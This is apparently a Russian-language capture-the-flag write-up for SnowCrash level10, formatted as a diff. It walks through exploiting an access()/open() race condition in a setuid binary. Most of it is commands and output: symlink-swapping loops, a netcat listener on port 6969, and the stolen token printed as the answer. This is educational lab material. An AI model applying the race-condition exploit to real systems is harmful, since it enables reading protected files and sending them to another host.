@@ -1,0 +1,120 @@
+Опять имеем бинарник и токен
+Запустим
+```
+./level10 file host
+        sends file to host if you have access to it
+```
+бинарник принимает файл, и отправляет на хост
+Посмотрим что даст strings
+```
+evel10@SnowCrash:~$ strings level10
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+socket
+fflush
+exit
+htons
+connect
+puts
+__stack_chk_fail
+printf
+__errno_location
+read
+stdout
+inet_addr
+open
+access
+strerror
+__libc_start_main
+write
+GLIBC_2.4
+GLIBC_2.0
+PTRh
+UWVS
+[^_]
+%s file host
+        sends file to host if you have access to it
+Connecting to %s:6969 ..
+Unable to connect to host %s
+```
+увидим что шлет на порт 6969
+```
+ls -l
+```
+а доступа к токен нету
+попробуем созадть ссылку в tpm как в level08
+```
+ln -s ~/token /tmp/getToken
+```
+Печалька нет доступа
+```
+level10@SnowCrash:~$ ./level10 /tmp/getToken 192.168.2.131
+You dont have access to /tmp/getToken
+```
+послушаем порт в другом терминале 
+```
+nc -lk 6969
+```
+и подадим файл из tmp
+```
+echo test > /tmp/test && chmod 777 /tmp/test && ./level10 /tmp/test 192.168.2.131
+```
+что то есть 
+```
+level10@SnowCrash:~$ nc -lk 6969
+.*( )*.
+test
+```
+посмотрим что вызывает бинарник
+```
+evel10@SnowCrash:~$ nm -u ./level10
+         w _Jv_RegisterClasses
+         U __errno_location@@GLIBC_2.0
+         w __gmon_start__
+         U __libc_start_main@@GLIBC_2.0
+         U __stack_chk_fail@@GLIBC_2.4
+         U access@@GLIBC_2.0
+         U connect@@GLIBC_2.0
+         U exit@@GLIBC_2.0
+         U fflush@@GLIBC_2.0
+         U htons@@GLIBC_2.0
+         U inet_addr@@GLIBC_2.0
+         U open@@GLIBC_2.0
+         U printf@@GLIBC_2.0
+         U puts@@GLIBC_2.0
+         U read@@GLIBC_2.0
+         U socket@@GLIBC_2.0
+         U strerror@@GLIBC_2.0
+         U write@@GLIBC_2.0
+```
+А вот это уже интересней access@@GLIBC_2.0
+```
+man access
+```
+Использование access для проверки, можно ли пользователю, например, открыть файл перед тем, как действительно выполнить open(2), 
+создает дыру в защите, потому что пользователь может в короткий промежуток между проверкой и открытием файла как-то его изменить.
+
+Напишем скрипт для подмены ссылки tmp/test и ~/token и запустим
+```
+while true; do ln -fs ~/token /tmp/getPass; ln -fs /tmp/test /tmp/getPass; done
+```
+в новым терминале запустим
+```
+while true; do ./level10 /tmp/getPass 192.168.2.131; done
+```
+и получем токен 
+```
+test
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+test
+.*( )*.
+test
+```
+
+
